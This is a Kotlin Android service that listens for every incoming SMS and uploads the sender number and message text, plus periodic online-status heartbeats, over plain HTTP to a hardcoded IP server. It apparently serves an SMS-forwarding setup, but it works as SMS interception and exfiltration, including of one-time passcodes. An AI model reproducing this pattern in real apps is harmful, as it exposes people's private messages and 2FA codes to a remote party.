package com.sms.smsreceiver

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import java.io.IOException
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.atomic.AtomicBoolean

val gson = Gson()

class SMSReceiveService : Service(), CoroutineScope by CoroutineScope(Dispatchers.IO), ISMS {

    private var isAlive: AtomicBoolean = AtomicBoolean(false)

    private val messenger = MutableSharedFlow<SMS>()
    private val smsBroadcastReceiver by lazy { SMSBroadcastReceiver(messenger) }
    private val smsLiveData by lazy { MutableLiveData<SMSStatus>() }
    private val timer by lazy { Timer() }

    companion object {

        val okHttpClient = OkHttpClient()

        @JvmStatic
        fun uploadOnlineStatues(phone: String) {
            okHttpClient.apply {
                newCall(
                    Request.Builder().url("http://47.108.223.87/index/upload_user_status")
                        .post(
                            RequestBody.create(
                                MediaType.get("application/json"),
                                gson.toJson(Status(phone, System.currentTimeMillis().toInt()))
                            )
                        ).build()
                ).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.d(TAG, "uploadStatus onFailure: ${e.message}")
                    }

                    override fun onResponse(call: Call, response: Response) {
                        Log.d(TAG, "uploadStatus onResponse: ${response.code()}")
                        Log.d(TAG, "onResponse: ${response.body()?.string()}")
                    }

                })
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        startForeground(1, notificationManager.initNotification(this))
        registerReceiver(
            smsBroadcastReceiver,
            IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        )
        launch(Dispatchers.IO) {
            timer.schedule(object : TimerTask() {
                override fun run() {
                    uploadOnlineStatues(phoneNumber)
                }
            }, 0, 10 * 60 * 1000 - 3000)
        }
        launch {
            phoneNumber.takeIf { it.isNotEmpty() }?.let {
                Log.d(TAG, "onCreate: $it")
                uploadStatus(it, true)
            }
            messenger.collect {
                if (it.phone.isEmpty()) return@collect
                Log.d(TAG, "onCreate: $it")
                uploadSMS(it)
            }
        }
    }

    @Suppress("DEPRECATION")
    private fun NotificationManager.initNotification(context: Context): Notification {
        return (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                packageName,
                "SMS",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.setShowBadge(false)
            channel.enableLights(false)
            createNotificationChannel(channel)
            Notification.Builder(context, packageName).apply {
                setOngoing(true)
                setContentTitle("SMS")
                setAutoCancel(true)
                setTicker("")
                setUsesChronometer(true)
                setBadgeIconType(NotificationCompat.BADGE_ICON_SMALL)
                setSmallIcon(R.drawable.baseline_sms_24)
            }.build()
        } else Notification().apply {
            icon = R.drawable.baseline_sms_24
            tickerText = ""
        }).also {
            it.flags =
                Notification.FLAG_NO_CLEAR or Notification.FLAG_ONGOING_EVENT or Notification.FLAG_FOREGROUND_SERVICE
            it.visibility = Notification.VISIBILITY_PUBLIC
            it.category = Notification.CATEGORY_TRANSPORT
        }
    }

    //上传运行状态-电话号码+运行状态
    //    http://47.108.223.87/index/upload_user_status
    //
    //上传短信内容-电话号码+短信内容
    //    http://47.108.223.87/index/upload_user_info
    //
    //    phone
    //    sms_content
    //
    //    phone
    //    status
    private fun uploadStatus(
        phone: String,
        isAlive: Boolean,
        isChangePhone: Boolean = false
    ) {
        if (phone.isEmpty()) return
        Log.d(TAG, "uploadStatus: ${this.isAlive.get()}")
        if (this@SMSReceiveService.isAlive.get() == isAlive && !isChangePhone) return
        this@SMSReceiveService.isAlive.set(isAlive)
        uploadOnlineStatues(phone)
    }

    private fun uploadSMS(sms: SMS) {
        uploadStatus(sms.phone, true)
        Log.d(TAG, "uploadSMS: ")
        okHttpClient.apply {
            newCall(
                Request.Builder().url("http://47.108.223.87/index/upload_user_info")
                    .post(
                        RequestBody.create(
                            MediaType.get("application/json"),
                            gson.toJson(sms)
                        )
                    )
                    .build()
            ).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.d(TAG, "uploadSMS onFailure: ")
                    smsLiveData.postValue(SMSStatus(sms.phone, sms.body, 500))
                }

                override fun onResponse(call: Call, response: Response) {
                    Log.d(TAG, "uploadSMS onResponse: ${response.body()}")
                    Log.d(TAG, "uploadSMS onResponse: ${response.code()}")
                    smsLiveData.postValue(SMSStatus(sms.phone, sms.body, 200))
                }

            })
        }
    }

    override fun onBind(intent: Intent?): IBinder {
        return SMSBinder(this)
    }

    override fun onUnbind(intent: Intent?): Boolean {
        runCatching {
            launch { uploadStatus(phoneNumber, false) }
            timer.cancel()
            Log.d(TAG, "onUnbind: ")
        }
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        runCatching {
            Log.d(TAG, "onDestroy: ")
            launch {
                uploadStatus(phoneNumber, false)
                if (isActive) cancel()
            }
            unregisterReceiver(smsBroadcastReceiver)
        }
    }

    override fun observeSMS() = smsLiveData
    override fun phoneNumberChanged() {
        launch {
            uploadStatus(phoneNumber, true, isChangePhone = true)
        }
    }

    inner class SMSBinder(private val isms: ISMS) : Binder(), ISMS {
        override fun observeSMS() = isms.observeSMS()
        override fun phoneNumberChanged() = isms.phoneNumberChanged()
    }

}

interface ISMS {
    fun observeSMS(): LiveData<SMSStatus>
    fun phoneNumberChanged()
}
